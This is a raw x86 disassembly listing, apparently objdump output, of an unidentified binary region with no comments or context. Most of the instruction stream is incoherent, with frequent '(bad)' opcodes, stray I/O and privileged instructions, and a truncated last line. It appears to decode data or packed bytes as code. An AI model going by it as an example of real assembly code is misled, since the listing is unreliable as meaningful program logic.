  40b375:	mov    eax,DWORD PTR [ebx]
  40b377:	mov    ebp,ebx
  40b379:	cmp    al,0xf
  40b37b:	or     al,al
  40b37d:	inc    ebp
  40b37e:	inc    ebp
  40b37f:	xor    eax,0x8bc89c8b
  40b384:	ins    BYTE PTR es:[edi],dx
  40b385:	cld    
  40b386:	add    BYTE PTR [edi+0x576c16c0],dh
  40b38c:	add    BYTE PTR [ecx-0x5],dl
  40b38f:	add    eax,0x17200
  40b394:	sbb    al,0x85
  40b396:	dec    esp
  40b397:	je     0x40b3d1
  40b399:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  40b39d:	add    BYTE PTR [ebx],bh
  40b39f:	(bad)  
  40b3a0:	and    al,0x34
  40b3a2:	jae    0x40b340
  40b3a4:	mov    cl,cl
  40b3a6:	inc    DWORD PTR [esp]
  40b3a9:	push   ebp
  40b3aa:	shr    esp,0x8
  40b3ad:	in     al,dx
  40b3ae:	push   esp
  40b3af:	and    DWORD PTR [eax],0xffffffdc
  40b3b2:	retf   
  40b3b3:	(bad)  
  40b3b4:	mov    bh,0xe4
  40b3b6:	add    BYTE PTR [ebp+0x450ff8e9],dh
  40b3bc:	retf   0x4cf5
  40b3bf:	pushf  
  40b3c0:	and    bh,al
  40b3c2:	pop    ss
  40b3c3:	rcr    cl,1
  40b3c5:	test   DWORD PTR [eax],eax
  40b3c7:	clc    
  40b3c8:	add    BYTE PTR [ebp+0x2b],al
  40b3cb:	xor    eax,ecx
  40b3cd:	pushf  
  40b3ce:	add    eax,0xd001c7
  40b3d3:	add    eax,0x456cf8c0
  40b3d8:	inc    eax
  40b3d9:	push   ebx
  40b3da:	rcr    DWORD PTR [eax+0x4c0105],0x20
  40b3e1:	inc    ebp
  40b3e2:	fst    DWORD PTR [esi+0x29]
  40b3e5:	mov    eax,DWORD PTR [eax]
  40b3e7:	nop
  40b3e8:	rol    BYTE PTR [eax],0xc0
  40b3eb:	mov    ecx,DWORD PTR [ebp-0x3c4fdbe4]
  40b3f1:	add    DWORD PTR [ebx-0x75f9af00],ecx
  40b3f7:	pop    ebp
  40b3f8:	add    DWORD PTR [ecx+0x758bf800],ecx
  40b3fe:	or     BYTE PTR [ebp-0xce8aca],al
  40b404:	mov    bl,BYTE PTR [eax]
  40b406:	add    DWORD PTR [ebp+0x0],edx
  40b409:	call   0xfff3b317
  40b40e:	add    DWORD PTR [edi],ecx
  40b410:	add    BYTE PTR [edi],al
  40b412:	push   cs
  40b413:	inc    ecx
  40b414:	or     BYTE PTR [ebx+0x18008901],0x8
  40b41b:	leave  
  40b41c:	dec    ecx
  40b41d:	dec    esi
  40b41e:	add    esi,DWORD PTR [ebp-0x39]
  40b421:	call   0xffe6a322
  40b426:	clc    
  40b427:	inc    ebp
  40b428:	inc    ebp
  40b429:	mov    ecx,DWORD PTR [edi]
  40b42b:	enter  0x49,0x35
  40b42f:	mov    ecx,DWORD PTR [eax]
  40b431:	xor    eax,0x79e0807
  40b436:	xor    bl,BYTE PTR [esi-0x743ecda2]
  40b43c:	or     al,0x1c
  40b43e:	sbb    BYTE PTR ds:0x8b004d01,0x0
  40b445:	int3   
  40b446:	test   DWORD PTR [eax],eax
  40b448:	clc    
  40b449:	inc    edx
  40b44b:	mov    eax,DWORD PTR [eax]
  40b44d:	fmul   DWORD PTR [ebx+0x74ff8300]
  40b453:	sub    BYTE PTR [ebp-0x40],ah
  40b456:	add    BYTE PTR [esi+0x45],bl
  40b459:	leave  
  40b45a:	xor    eax,0xc78b9c18
  40b45f:	jl     0x40b441
  40b461:	add    BYTE PTR [ebp+0x458df88b],al
  40b467:	add    al,0x31
  40b469:	or     BYTE PTR [eax+ebp*8-0x3617f139],bl
  40b470:	test   edx,esp
  40b472:	clc    
  40b473:	or     eax,DWORD PTR [ebp+0x40]
  40b476:	xor    eax,0x8b949f89
  40b47b:	inc    ebp
  40b47c:	sbb    al,0xbe
  40b47e:	mov    ecx,DWORD PTR [eax]
  40b480:	xchg   esp,eax
  40b481:	pop    es
  40b482:	add    dh,al
  40b484:	mov    esp,DWORD PTR [ebp+0x1c]
  40b487:	add    BYTE PTR [edi-0x62],dl
  40b48a:	mov    eax,0x30132
  40b48f:	mov    DWORD PTR [ebp-0x68],eax
  40b492:	mov    eax,DWORD PTR [ebp-0x74]
  40b495:	xor    eax,DWORD PTR [eax]
  40b497:	add    ecx,DWORD PTR [ebx-0xf637677]
  40b49d:	inc    ebp
  40b49e:	jge    0x40b4f0
  40b4a0:	mov    DWORD PTR [ebp-0xc],eax
  40b4a3:	xor    eax,eax
  40b4a5:	add    ecx,DWORD PTR [ebx]
  40b4a7:	push   eax
  40b4a8:	jne    0x40b4ef
  40b4aa:	mov    eax,DWORD PTR ds:0x3f001c
  40b4b0:	dec    DWORD PTR [ebx-0x7f74e375]
  40b4b6:	add    eax,DWORD PTR [ecx]
  40b4b8:	cmp    al,0x0
  40b4ba:	push   cs
  40b4bb:	inc    ebp
  40b4bc:	inc    ebp
  40b4bd:	add    al,0x85
  40b4bf:	add    BYTE PTR [edi+edi*8-0x1],dh
  40b4c3:	mov    ebx,DWORD PTR [esp+ecx*1]
  40b4c6:	mov    ebp,0x8bffff4d
  40b4cb:	mov    ebx,DWORD PTR [esp+esi*8]
  40b4ce:	sbb    al,0x1
  40b4d1:	inc    ebp
  40b4d2:	add    BYTE PTR [ebx-0x74a87700],cl
  40b4d8:	push   ecx
  40b4d9:	clc    
  40b4da:	add    eax,0x457218
  40b4df:	mov    eax,DWORD PTR [ebp+0x50]
  40b4e2:	jne    0x40b529
  40b4e4:	mov    ecx,DWORD PTR [ebx-0x39761fe4]
  40b4ea:	add    edi,eax
  40b4ec:	add    BYTE PTR [ebp+0x31],al
  40b4ef:	lea    eax,[eax+0x4501dc]
  40b4f5:	lea    edx,[eax-0x74]
  40b4f8:	xor    ecx,DWORD PTR [ebx-0x39a4f7a1]
  40b4fe:	ret    0xc7
  40b501:	mov    eax,DWORD PTR [eax+0xee011c]
  40b507:	add    BYTE PTR [eax],cl
  40b509:	push   eax
  40b50a:	inc    ebp
  40b50b:	inc    ebp
  40b50c:	add    DWORD PTR [ebx+0x8b98eb],ecx
  40b512:	test   edi,eax
  40b514:	jne    0x40b4a2
  40b516:	mov    eax,DWORD PTR [eax]
  40b518:	mov    eax,DWORD PTR [eax]
  40b51a:	push   eax
  40b51b:	pop    ebp
  40b51c:	inc    ebp
  40b51d:	dec    DWORD PTR [ebx+0x570ce48b]
  40b523:	rcl    BYTE PTR [ecx-0x40],1
  40b526:	xor    esi,DWORD PTR [eax]
  40b528:	add    DWORD PTR [ebp-0x70],0xffffff83
  40b52c:	mov    edi,0x8372fc
  40b531:	push   eax
  40b532:	(bad)  
  40b533:	jbe    0x40b57a
  40b535:	mov    ecx,DWORD PTR [ebx-0x39341714]
  40b53b:	ret    
  40b53c:	(bad)  
  40b53d:	dec    ebp
  40b53e:	inc    ebp
  40b53f:	jmp    0x40b4ce
  40b541:	mov    ecx,DWORD PTR [esp+eiz*8-0xf7f375]
  40b548:	(bad)  
  40b549:	cld    
  40b54a:	(bad)  
  40b54b:	push   ebp
  40b54c:	mov    ecx,DWORD PTR [eax+0x18aa8b1c]
  40b552:	add    BYTE PTR [ebx],bh
  40b554:	push   eax
  40b555:	push   eax
  40b556:	inc    ebp
  40b557:	jmp    0x3d900e7
  40b55c:	add    BYTE PTR [ebx+0x8ca0c7],cl
  40b562:	add    BYTE PTR [ebx-0x13cfd500],cl
  40b568:	inc    ebp
  40b569:	ret    
  40b56a:	mov    DWORD PTR [ebp-0x14],edx
  40b56d:	mov    edx,eax
  40b56f:	sub    BYTE PTR [ebp-0x2d],cl
  40b572:	mov    ecx,DWORD PTR [ebp-0x75]
  40b575:	mov    eax,esi
  40b577:	rol    BYTE PTR [eax],1
  40b579:	inc    ebp
  40b57a:	add    DWORD PTR [eax],eax
  40b57c:	inc    ebp
  40b57d:	add    BYTE PTR [ecx+0x18838beb],cl
  40b583:	clc    
  40b584:	inc    eax
  40b585:	jmp    0x8d45:0x74945589
  40b58c:	xor    ecx,DWORD PTR [eax]
  40b58e:	add    edx,DWORD PTR [ebp-0x77]
  40b591:	mov    ebx,DWORD PTR [eax-0x76aaba18]
  40b597:	mov    ebx,DWORD PTR [eax+edi*8-0x76af48bb]
  40b59e:	inc    ebp
  40b59f:	fdiv   DWORD PTR [ebx]
  40b5a1:	loop   0x40b5a6
  40b5a3:	(bad)  
  40b5a5:	add    BYTE PTR [ebp+0x55],al
  40b5a8:	add    eax,0xd8008b
  40b5ad:	jmp    0xcd80:0x621c818b
  40b5b4:	add    DWORD PTR [ebx],esi
  40b5b6:	add    BYTE PTR [ecx-0x63fbcdbb],al
  40b5bc:	add    BYTE PTR [ebp-0x77],dh
  40b5bf:	mov    edx,DWORD PTR [eax+0x45cb30d4]
  40b5c5:	dec    ebp
  40b5c6:	inc    DWORD PTR [ebx]
  40b5c8:	test   DWORD PTR [ebx+0x108b0074],eax
  40b5ce:	sbb    BYTE PTR [ebp+0x65],dl
  40b5d1:	add    eax,DWORD PTR [eax]
  40b5d3:	mov    edi,DWORD PTR [eax-0x75]
  40b5d6:	add    ah,dl
  40b5d8:	and    edx,DWORD PTR [ecx*2-0x741bd475]
  40b5df:	dec    ebp
  40b5e0:	mov    DWORD PTR [ebx-0xfc071c],eax
  40b5e6:	dec    ebp
  40b5e7:	call   0x55426376
  40b5ec:	inc    ebp
  40b5ed:	add    DWORD PTR [ebx+0x855fcf4],ecx
  40b5f3:	cmp    ecx,DWORD PTR [ebp-0x5c]
  40b5f6:	inc    eax
  40b5f7:	add    BYTE PTR [ecx+0x73],dl
  40b5fa:	jb     0x40b5ff
  40b5fc:	mov    esi,eax
  40b5fe:	cmp    al,0x50
  40b600:	retf   
  40b601:	mov    DWORD PTR [ecx+0x4500f0],eax
  40b607:	test   ebx,edx
  40b609:	andnps xmm6,XMMWORD PTR [edx+0x3]
  40b60d:	dec    DWORD PTR [ecx+0x51ecfc8b]
  40b613:	inc    ebp
  40b614:	add    eax,edi
  40b616:	mov    DWORD PTR [eax+ebx*1-0x38ffab00],ecx
  40b61d:	inc    ecx
  40b61e:	hlt    
  40b61f:	mov    DWORD PTR [eax],eax
  40b621:	xchg   esp,eax
  40b622:	add    BYTE PTR [ebp+0x7d],al
  40b625:	xor    eax,edx
  40b627:	add    edx,ecx
  40b629:	mov    DWORD PTR [ecx+0x5f45e898],ecx
  40b62f:	mov    DWORD PTR [eax-0x64],edx
  40b632:	mov    DWORD PTR [ebp-0x8],eax
  40b635:	push   eax
  40b636:	push   ebp
  40b637:	inc    ebp
  40b638:	mov    DWORD PTR [ebx],esi
  40b63a:	call   0xf910b42
  40b63f:	inc    ebp
  40b640:	adc    al,BYTE PTR ds:0x810055
  40b646:	dec    DWORD PTR [ebx-0x7f76e400]
  40b64c:	aam    0x1
  40b64e:	push   ebp
  40b64f:	add    cl,al
  40b651:	xor    BYTE PTR [eax*2-0x7472003e],cl
  40b658:	call   FWORD PTR [esi+edx*8]
  40b65b:	cmp    dl,0x1
  40b65e:	test   DWORD PTR [eax],eax
  40b660:	clc    
  40b661:	inc    ebp
  40b662:	and    cl,BYTE PTR [ebx+0x7503fc4d]
  40b668:	mov    DWORD PTR [ecx+0x1008ffd4],ecx
  40b66e:	cmp    edi,edi
  40b670:	je     0x40b642
  40b672:	mov    eax,DWORD PTR [ebp-0x4]
  40b675:	add    edx,DWORD PTR [ecx]
  40b677:	sbb    al,0x0
  40b679:	dec    ebp
  40b67a:	dec    ebp
  40b67b:	mov    DWORD PTR [ecx+0x4545011c],ecx
  40b681:	mov    ecx,DWORD PTR [ebx+0x4590181c]
  40b687:	add    DWORD PTR [edx],eax
  40b689:	add    BYTE PTR [ebp+0x45],cl
  40b68c:	jne    0x40b619
  40b68e:	mov    ecx,DWORD PTR [eax+esi*8-0x7474ab00]
  40b695:	cmp    esp,esi
  40b697:	jb     0x40b62a
  40b699:	mov    eax,DWORD PTR [eax]
  40b69b:	mov    eax,DWORD PTR [eax]
  40b69d:	mov    edx,DWORD PTR [esp+edi*1]
  40b6a0:	inc    ebp
  40b6a1:	je     0x40b62e
  40b6a3:	push   eax
  40b6a4:	add    al,0x38
  40b6a6:	push   ebp
  40b6a7:	mov    DWORD PTR ds:[ecx],edi
  40b6aa:	in     al,0xc
  40b6ac:	shl    BYTE PTR [eax],cl
  40b6ae:	test   DWORD PTR [ecx],eax
  40b6b0:	call   DWORD PTR [edx]
  40b6b2:	inc    esi
  40b6b4:	inc    ebp
  40b6b5:	ror    BYTE PTR [ecx+0x45459011],1
  40b6bb:	jmp    0xff41b3c4
  40b6c0:	mov    ecx,DWORD PTR [ebx-0xfba7eb0]
  40b6c6:	mov    eax,DWORD PTR [eax]
  40b6c8:	loopne 0x40b655
  40b6ca:	(bad)  
  40b6cb:	sbb    al,0xc7
  40b6cd:	inc    ebp
  40b6ce:	inc    ebp
  40b6cf:	push   ebx
  40b6d0:	lea    edi,[eax+0x454fdc]
  40b6d6:	lea    ecx,[ecx-0x74a774]
  40b6dc:	or     BYTE PTR [edi-0x3a],dl
  40b6df:	js     0x40b6a8
  40b6e1:	mov    ecx,DWORD PTR [ebx-0x117ae39a]
  40b6e7:	inc    DWORD PTR [eax]
  40b6e9:	call   DWORD PTR [eax+0x79]
  40b6ec:	inc    ebp
  40b6ed:	add    BYTE PTR [ebx+0x859866],cl
  40b6f3:	(bad)  
  40b6f4:	(bad)  
  40b6f5:	dec    DWORD PTR [ebx-0x2f99f3b9]
  40b6fb:	test   DWORD PTR [ebp-0x1],eax
  40b6fe:	mov    edi,edi
  40b700:	add    al,0x0
  40b703:	add    ax,WORD PTR [ebp-0xb20004]
  40b70a:	inc    DWORD PTR [edx+0x14]
  40b70d:	add    BYTE PTR [eax],cl
  40b70f:	data16 jne 0x40b697
  40b712:	push   ebx
  40b713:	call   DWORD PTR [ebp-0x1]
  40b716:	mov    eax,eax
  40b718:	cld    
  40b719:	inc    bp
  40b71b:	test   DWORD PTR [ebp+0x45ff04ff],ecx
  40b721:	inc    eax
  40b722:	mov    eax,DWORD PTR [eax]
  40b724:	sbb    al,0x66
  40b726:	inc    ebp
  40b727:	test   DWORD PTR [ebx+0xff90ff],ecx
  40b72d:	ror    BYTE PTR [ebx-0x7f7ae39a],0xff
  40b734:	add    edi,edi
  40b736:	add    BYTE PTR [ebp+0x30],al
  40b739:	add    BYTE PTR [ecx],dh
  40b73b:	popw   ds
  40b73d:	test   DWORD PTR [edx],esi
  40b73f:	(bad)  
  40b740:	cmp    bh,bh
  40b742:	jbe    0x40b70b
  40b744:	lea    ecx,[ecx-0x7493c9]
  40b74a:	add    edi,DWORD PTR [eax+0x734f39]
  40b750:	mov    ecx,DWORD PTR [ecx-0x749175]
  40b756:	sub    edi,DWORD PTR [eax+0x89d003]
  40b75c:	mov    ecx,DWORD PTR [ecx-0x698f04]
  40b762:	(bad)  
  40b763:	mov    eax,0xecd755
  40b768:	in     al,dx
  40b769:	mov    DWORD PTR [eax],eax
  40b76b:	jb     0x40b76d
  40b76d:	inc    DWORD PTR [ebp-0x48]
  40b770:	mov    ecx,esp
  40b772:	sbb    al,0x0
  40b774:	push   esi
  40b775:	mov    DWORD PTR ds:0x66ff0074,ecx
  40b77b:	mov    DWORD PTR [ebp-0x7a0014],0xad7d8df8
  40b785:	add    bh,al
  40b787:	mov    WORD PTR [ebp-0xa6],ax
  40b78e:	mov    eax,0x354f45
  40b793:	pushf  
  40b794:	mov    DWORD PTR [ebp-0x7600fda4],ecx
  40b79a:	lea    edi,[eax+0x4]
  40b79d:	dec    DWORD PTR [ecx-0x1ba13a]
  40b7a3:	mov    BYTE PTR [ebx-0x7639af1b],0xe6
  40b7aa:	pusha  
  40b7ab:	(bad)  
  40b7ac:	jmp    edi
  40b7ae:	mov    eax,0xe84fc6
  40b7b3:	xor    ecx,DWORD PTR [ecx-0x169d3a]
  40b7b9:	xor    eax,DWORD PTR [ebx-0x76ff3a42]
  40b7bf:	add    BYTE PTR [esp+eax*2-0x1],ah
  40b7c3:	in     al,0xb8
  40b7c5:	mov    dh,0x4f
  40b7c7:	add    DWORD PTR [eax],0x49
  40b7ca:	mov    esi,ebx
  40b7cc:	data16 mov bh,bh
  40b7cf:	add    DWORD PTR [ebx-0x7613c7fa],0x45
  40b7d6:	push   0xb845ffe3
  40b7db:	loope  0x40b82c
  40b7dd:	inc    ebp
  40b7de:	add    bl,dl
  40b7e0:	mov    DWORD PTR [ebp+0x6a],eax
  40b7e3:	out    dx,al
  40b7e4:	inc    DWORD PTR [ebp-0x75]
  40b7e7:	and    DWORD PTR [esi+0x45],esp
  40b7ea:	test   DWORD PTR [esi],ebp
  40b7ec:	inc    DWORD PTR [ebp-0x1]
  40b7ef:	jl     0x40b83a
  40b7f1:	leave  
  40b7f2:	add    BYTE PTR [esi+eiz*2-0x24],al
  40b7f6:	test   DWORD PTR [esi+0x49ff83ff],esi
  40b7fc:	outs   dx,DWORD PTR ds:[esi]
  40b7fd:	fiadd  WORD PTR [eax]
  40b7ff:	mov    BYTE PTR [esi-0x7d],ah
  40b802:	test   DWORD PTR [edi],eax
  40b804:	(bad)  
  40b805:	in     al,dx
  40b806:	inc    DWORD PTR [ebp+0x6c]
  40b809:	loope  0x40b80b
  40b80b:	inc    ebp
  40b80c:	data16 aam 0x85
  40b80f:	inc    ebp
  40b810:	(bad)  
  40b811:	call   0xe5bcfe15
  40b816:	add    BYTE PTR [ebp+0x66],al
  40b819:	fild   WORD PTR [ebp-0x1300bb]
  40b81f:	inc    ebp
  40b820:	inc    ebp
  40b821:	xlat   BYTE PTR ds:[ebx]
  40b822:	xor    al,0x45
  40b824:	pushf  
  40b825:	jl     0x40b7df
  40b827:	leave  
  40b828:	icebp  
  40b829:	inc    esp
  40b82a:	add    ah,dl
  40b82c:	mov    DWORD PTR [esi+0x49ff8376],esi
  40b832:	(bad)  
  40b833:	fdivrp st(0),st
  40b835:	mov    BYTE PTR [ebp+0x4708f883],al
  40b83b:	in     al,dx
  40b83c:	test   WORD PTR [ebp-0x1],ax
  40b843:	inc    ebp
  40b844:	inc    ebp
  40b845:	mov    edx,ebp
  40b847:	cld    
  40b848:	inc    ebp
  40b849:	out    dx,eax
  40b84a:	rcl    BYTE PTR [ebx],1
  40b84c:	inc    ebp
  40b84d:	mov    edi,edx
  40b84f:	mov    eax,DWORD PTR [ebp+0x54]
  40b852:	and    edi,edi
  40b854:	inc    ebp
  40b855:	cmp    ebp,DWORD PTR [esi]
  40b857:	jne    0x40b82b
  40b859:	mov    DWORD PTR [ebp-0x44],0xf8c9857c
  40b860:	retf   
  40b861:	inc    ebp
  40b862:	add    dl,ah
  40b864:	lea    ebx,[ebp+ecx*1+0x181c0f8b]
  40b86b:	xor    bl,0x1
  40b86e:	add    eax,DWORD PTR [eax]
  40b870:	inc    ecx
  40b871:	adc    BYTE PTR [eax],bl
  40b873:	test   ecx,edi
  40b875:	add    dh,BYTE PTR [edx+0x0]
  40b878:	mov    BYTE PTR [ebp-0x24],0x8b
  40b87c:	(bad)  
  40b87d:	jl     0x40b85c
  40b87f:	add    dh,al
  40b881:	mov    esi,ebx
  40b883:	mov    eax,esi
  40b885:	sbb    al,0xdf
  40b887:	add    dh,0x1
  40b88a:	loopne 0x40b88c
  40b88c:	(bad)  
  40b88d:	adc    cl,ah
  40b88f:	or     dh,al
  40b891:	inc    ebp
  40b892:	loop   0x40b875
  40b894:	xor    ebp,eax
  40b896:	(bad)  
  40b897:	(bad)  
  40b898:	or     eax,0x18ec0ff8
  40b89d:	jl     0x40b892
  40b89f:	inc    ebp
  40b8a0:	add    ebx,DWORD PTR [ecx+0x41]
  40b8a3:	adc    BYTE PTR [eax],bl
  40b8a5:	repnz stc 
  40b8a7:	xor    BYTE PTR [edx+0x35],0xc6
  40b8ab:	adc    ah,dl
  40b8ad:	dec    ecx
  40b8ae:	(bad)  
  40b8af:	repnz aad 0x45
  40b8b2:	(bad)  
  40b8b3:	mov    esi,edx
  40b8b5:	adc    al,0xc6
  40b8b7:	call   edi
  40b8b9:	(bad)  
  40b8ba:	(bad)  
  40b8bb:	adc    al,bl
  40b8bd:	inc    esi
  40b8bf:	push   eax
  40b8c0:	fld    DWORD PTR [ebp-0x3a]
  40b8c3:	mov    esi,0x7c608da
  40b8c8:	fcmovnb st,st(6)
  40b8ca:	xor    ebx,DWORD PTR [esi+0x30d328d]
  40b8d0:	(bad)  
  40b8d2:	sbb    BYTE PTR [ebp-0xd],al
  40b8d5:	add    DWORD PTR [ebx],0x66
  40b8d8:	inc    ecx
  40b8d9:	mov    ebx,DWORD PTR [eax]
  40b8db:	sbb    al,0xf9
  40b8dd:	xor    BYTE PTR [edx+0x1],0x8d
  40b8e1:	add    BYTE PTR [ebp+eax*4-0x1],dl
  40b8e5:	dec    DWORD PTR [ecx+0x4d00fcff]
  40b8eb:	add    BYTE PTR [eax+0x7145fc30],bh
  40b8f1:	inc    DWORD PTR [ecx]
  40b8f3:	mov    ecx,DWORD PTR [ebp-0x310010]
  40b8f9:	retf   
  40b8fa:	enter  0xe45,0x3b
  40b8fe:	inc    ebp
  40b8ff:	jne    0x40b936
  40b901:	mov    eax,ds:0x33c70b9c
  40b906:	mov    esp,0xf81585ef
  40b90b:	mov    ds:0x338b0b45,eax
  40b910:	mov    WORD PTR [edi-0x5cc68e00],cs
  40b916:	ud2    
  40b918:	xchg   ebp,eax
  40b919:	xor    eax,DWORD PTR [eax]
  40b91b:	dec    edx
  40b91c:	mov    eax,DWORD PTR [eax]
  40b91e:	sbb    al,0x83
  40b920:	cmp    ah,0x1
  40b923:	push   0x0
  40b925:	pop    eax
  40b926:	adc    BYTE PTR [ecx-0x7483bb],cl
  40b92c:	and    BYTE PTR [esi+0x0],0x85
  40b930:	mov    edi,edi
  40b932:	push   0xffffffff
  40b934:	(bad)  
  40b935:	mov    esp,esi
  40b937:	adc    ah,0x75
  40b93a:	in     eax,0x66
  40b93c:	inc    ebp
  40b93d:	inc    ebp
  40b93e:	fild   QWORD PTR [edx-0x29]
  40b941:	mov    ecx,DWORD PTR [ebp-0x75990be4]
  40b947:	inc    ebp
  40b948:	sub    BYTE PTR [edx+0x49],0x58
  40b94c:	jmp    0x752c:0x40868889
  40b953:	lea    ax,[ebp-0xc]
  40b957:	xor    eax,DWORD PTR [ebp-0x5f0078]
  40b95d:	mov    DWORD PTR [ebp-0x820076],eax
  40b963:	stos   DWORD PTR es:[edi],eax
  40b964:	mov    ebp,DWORD PTR [ebx-0x43a87414]
  40b96a:	push   ecx
  40b96b:	test   DWORD PTR [ebx],esi
  40b96d:	(bad)  
  40b96e:	mov    ebx,0xc072ff
  40b973:	push   ebp
  40b974:	ret    
  40b975:	(bad)  
  40b976:	mov    eax,eax
  40b978:	sbb    al,0xdf
  40b97a:	rcl    ah,0x50
  40b97d:	inc    ebp
  40b97e:	inc    ebp
  40b97f:	into   
  40b980:	mov    ebp,ebx
  40b982:	cwde   
  40b983:	mov    DWORD PTR [eax],0x10d3c7c8
  40b989:	call   0xdf41ff8d
  40b98e:	add    cl,ch
  40b990:	jmp    DWORD PTR [esi-0x75]
  40b993:	inc    ebp
  40b994:	or     BYTE PTR [edi],bh
  40b996:	rol    bh,1
  40b998:	dec    ebp
  40b999:	adc    BYTE PTR [ebx],dh
  40b99b:	inc    DWORD PTR [ebx]
  40b99d:	add    cl,BYTE PTR [ecx-0x3e174400]
  40b9a3:	push   ss
  40b9a4:	push   ds
  40b9a5:	add    dh,ch
  40b9a7:	test   DWORD PTR [ebx-0x1],esi
  40b9aa:	or     eax,0x22850bff
  40b9af:	(bad)  
  40b9b0:	out    dx,al
  40b9b1:	push   DWORD PTR [ebx-0x75]
  40b9b4:	add    eax,0x3357e9ec
  40b9b9:	push   ecx
  40b9ba:	out    dx,al
  40b9bb:	xor    esi,DWORD PTR [ebx+0x3]
  40b9be:	jmp    0x85bb13
  40b9c3:	and    DWORD PTR [ebp+0x44],0x0
  40b9c7:	mov    esp,DWORD PTR [eax]
  40b9c9:	sbb    al,0x66
  40b9cb:	add    BYTE PTR [ebp-0xff00ff],0x30
  40b9d2:	mov    DWORD PTR [ebp+0x7e],eax
  40b9d5:	(bad)  
  40b9d6:	inc    DWORD PTR [ebx-0xbadf9a]
  40b9dc:	push   0xffffffff
  40b9de:	pop    eax
  40b9df:	clc    
  40b9e0:	mov    DWORD PTR [eax],ecx
  40b9e2:	or     BYTE PTR [ecx-0x8aef8d],0x58
  40b9e9:	mov    DWORD PTR [ecx+0x76ff8428],ecx
  40b9ef:	lea    esp,[esi+0x10]
  40b9f2:	inc    ebp
  40b9f3:	jmp    FWORD PTR [edx+0x50]
  40b9f6:	pop    eax
  40b9f7:	inc    ebp
  40b9f8:	mov    DWORD PTR [ebx],esi
  40b9fa:	mov    BYTE PTR [ebx],al
  40b9fc:	rcl    BYTE PTR [eax+0x45],0x85
  40ba00:	inc    WORD PTR [ebp-0x1]
  40ba04:	lea    ecx,[ebx-0x7f99e35f]
  40ba0a:	stos   BYTE PTR es:[edi],al
  40ba0b:	add    DWORD PTR [ebp+0x0],eax
  40ba0e:	mov    ecx,ecx
  40ba10:	adc    al,0x95
  40ba12:	(bad)  
  40ba13:	push   DWORD PTR [ebx]
  40ba15:	dec    DWORD PTR [ebp+0x45ffc095]
  40ba1b:	dec    esp
  40ba1d:	push   ebp
  40ba1e:	loopne 0x40b9a9
  40ba20:	(bad)  
  40ba21:	adc    al,0xc4
  40ba23:	call   ebx
  40ba25:	mov    ebp,ebp
  40ba27:	sbb    BYTE PTR [ebp-0x1],al
  40ba2a:	loop   0x40b9b5
  40ba2c:	ds and al,0xc7
  40ba2f:	dec    esp
  40ba31:	mov    edx,ebp
  40ba33:	sub    al,0xe1
  40ba35:	inc    edi
  40ba37:	mov    eax,edx
  40ba39:	xor    BYTE PTR [edi+edi*8-0x7b],bh
  40ba3d:	(bad)  
  40ba3e:	dec    DWORD PTR [ebx-0x2ffff701]
  40ba44:	add    BYTE PTR [ebp+0x2c],al
  40ba47:	push   eax
  40ba48:	add    bh,dl
  40ba4a:	mov    DWORD PTR [ebp+0x18],edi
  40ba4d:	jbe    0x40ba4e
  40ba4f:	test   DWORD PTR [ebp-0xffefff],ecx
  40ba55:	inc    ebp
  40ba56:	push   eax
  40ba57:	add    DWORD PTR [ebp-0x4],0x801be
  40ba5e:	pop    es
  40ba5f:	add    dh,0xfe
  40ba62:	ret    
  40ba63:	dec    DWORD PTR [ebx-0x3fffe346]
  40ba69:	mov    ecx,0x454f50
  40ba6e:	mov    eax,ecx
  40ba70:	cwde   
  40ba71:	mov    DWORD PTR [eax],eax
  40ba73:	test   al,0xff
  40ba75:	ror    BYTE PTR [ebx-0x2f99f775],0x55
  40ba7c:	lea    ecx,[ebp-0x7600f201]
  40ba82:	mov    ebp,DWORD PTR [edx+ebp*2-0x7a99a73e]
  40ba89:	push   ebp
  40ba8a:	dec    DWORD PTR [ebp-0x767aec01]
  40ba90:	push   DWORD PTR [eax+0x6685c2ff]
  40ba96:	call   DWORD PTR [ebp-0x1]
  40ba99:	lea    ecx,[ebx-0x397613df]
  40ba9f:	mov    ah,0xc3
  40baa1:	mov    DWORD PTR [ebp-0x30a74a],ecx
  40baa7:	mov    DWORD PTR [eax-0x48],edx
  40baaa:	inc    ebp
  40baab:	dec    edx
  40baac:	mov    ecx,DWORD PTR [ebx+0x55006698]
  40bab2:	xor    ecx,DWORD PTR [ebx+0x557c668d]
  40bab8:	dec    DWORD PTR [ebp-0x76e3b277]
  40babe:	call   DWORD PTR [eax-0x6d5f7673]
  40bac4:	lea    eax,[ecx-0x1]
  40bac7:	inc    WORD PTR [ebp-0x73]
  40bacb:	cmp    edi,0x3
  40bace:	dec    DWORD PTR [ecx+0x41ff9695]
  40bad4:	jmp    DWORD PTR [esi-0x73]
  40bad7:	inc    ebp
  40bad8:	jmp    DWORD PTR [esi-0x1]
  40badb:	dec    ebp
  40badc:	lea    esp,[esi-0x1]
  40badf:	jge    0x40bae0
  40bae1:	mov    esi,DWORD PTR [eax]
  40bae3:	lock inc ebp
  40bae5:	mov    bh,0xff
  40bae7:	mov    WORD PTR [ebp-0x3c5f3a],cs
  40baed:	rol    DWORD PTR [eax+0xf8ca289],0x45
  40baf4:	push   cs
  40baf5:	str    WORD PTR [ebp-0x1]
  40baf9:	xor    edi,esp
  40bafb:	add    edi,DWORD PTR [ebp+0x33]
  40bafe:	add    BYTE PTR [esi+0x0],ah
  40bb01:	inc    ebp
  40bb02:	rdpmc  
  40bb04:	mov    edi,0xbf45ff66
  40bb09:	dec    si
  40bb0b:	inc    ebp
  40bb0c:	add    BYTE PTR [ebx+0x45000c12],cl
  40bb12:	mov    edi,edi
  40bb14:	data16 sbb al,0x45
  40bb17:	jne    0x40ba9c
  40bb19:	push   ebp
  40bb1b:	adc    al,0xd0
  40bb1d:	jne    0x40baa8
  40bb1f:	jmp    FWORD PTR [edx+0x66755108]
  40bb25:	call   0xffc4b37f
  40bb2a:	or     BYTE PTR [ebp-0x77],al
  40bb2d:	mov    ebp,DWORD PTR [esi+0x6645511c]
  40bb33:	mov    edx,DWORD PTR [ebp-0x70]
  40bb36:	add    DWORD PTR [eax],0x3
  40bb39:	mov    ecx,DWORD PTR [ecx+0x5180b21c]
  40bb3f:	add    DWORD PTR [esi+0x0],esp
  40bb42:	push   ebp
  40bb43:	xor    BYTE PTR [esi+0x4d],ah
  40bb46:	dec    ebp
  40bb47:	mov    ecx,DWORD PTR [ebx+0x4d72663b]
  40bb4d:	mov    ecx,DWORD PTR [ebp-0x2ec30075]
  40bb53:	jl     0x40bade
  40bb55:	push   eax
  40bb56:	mov    esi,?
  40bb58:	rcl    bh,1
